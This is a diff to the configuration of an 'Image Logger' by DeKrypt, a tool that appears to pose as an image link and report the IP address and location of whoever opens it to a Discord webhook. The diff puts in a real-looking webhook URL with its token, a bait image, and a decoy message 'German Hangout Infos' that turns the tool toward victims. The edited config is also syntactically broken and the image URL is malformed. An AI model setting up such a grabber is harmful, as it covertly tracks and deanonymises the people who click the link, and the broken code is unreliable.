@@ -10,13 +10,14 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": ("https://discordapp.com/api/webhooks/1363943147033592043/b-mEqM5qRZxMJSaSRJ4wmg0ixRP9JISjWfuiT1cTpf51N4Vruowsmr8wT323WgURZ0UO")
+",
+    "image": "hhttps://www.bing.com/images/search?view=detailV2&ccid=BmMkgjPE&id=50D79A4369337474A57416E98B7D440081F6C391&thid=OIP.BmMkgjPEIsO2ryWzj2mLEQHaEK&mediaurl=https%3a%2f%2ftr.rbxcdn.com%2f180DAY-78c9433237bd575ba766dd7578e86a8f%2f500%2f280%2fImage%2fJpeg%2fnoFilter&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.0663248233c422c3b6af25b38f698b11%3frik%3dkcP2gQBEfYvpFg%26pid%3dImgRaw%26r%3d0&exph=280&expw=498&q=german+hangout&simid=608038933469884197&FORM=IRPRST&ck=03037FC105BC38CD60248A0750DA0767&selectedIndex=0&itb=0&ajaxhist=0&ajaxserp=0", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "GalaxyBot": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -25,8 +26,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "German Hangout Infos", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
